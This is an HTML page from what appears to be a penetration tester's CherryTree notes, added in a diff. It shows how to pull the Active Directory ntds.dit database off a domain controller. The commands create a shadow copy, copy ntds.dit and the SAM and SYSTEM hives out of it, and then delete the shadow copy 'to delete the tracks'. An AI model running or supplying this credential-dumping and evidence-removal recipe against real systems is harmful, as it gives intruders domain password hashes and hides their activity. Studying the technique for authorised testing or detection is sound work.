@@ -1,0 +1,28 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>vssadmin (built-in Powershell 3.0+)</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+
+<body>
+  <div class='page'>
+    <h1 class='title'>vssadmin (built-in Powershell 3.0+)</h1><br /><br /><strong>
+      <h3>Vssadmin</h3>
+    </strong><br />Extract the ntds.dit file directly from the Domain Controller. We can apply this method from
+    Powershell 3.0<br /><br />
+    <div class="codebox">
+      <div class="codebox">
+        C:\&gt;&nbsp;vssadmin&nbsp;create&nbsp;shadow&nbsp;/for=C:<br />C:\&gt;&nbsp;copy&nbsp;\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\ntds\ntds.dit&nbsp;.<br />C:\&gt;&nbsp;copy&nbsp;\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\system32\config\SYSTEM&nbsp;.<br />C:\&gt;&nbsp;copy&nbsp;\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\system32\config\SAM&nbsp;.<br />C:\&gt;&nbsp;vssadmin&nbsp;delete&nbsp;shadows&nbsp;/shadow={2f5471a0-9881-4ab4-9a6e-fb24ce6a23fc}&nbsp;&nbsp;#to&nbsp;delete&nbsp;the&nbsp;tracks&nbsp;with&nbsp;Shadow&nbsp;Copy&nbsp;ID
+      </div>
+    </div><br /> <a href=""><img src="images/1193-1.png" alt="images/1193-1.png" /></a><br /> <a href=""><img
+        src="images/1193-2.png" alt="images/1193-2.png" /></a><br /> <a href=""><img src="images/1193-3.png"
+        alt="images/1193-3.png" /></a><br /><br /><br />Bibliography:<br />• <a
+      href="https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/" target="_blank">https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/</a>
+  </div>
+</body>
+
+</html>
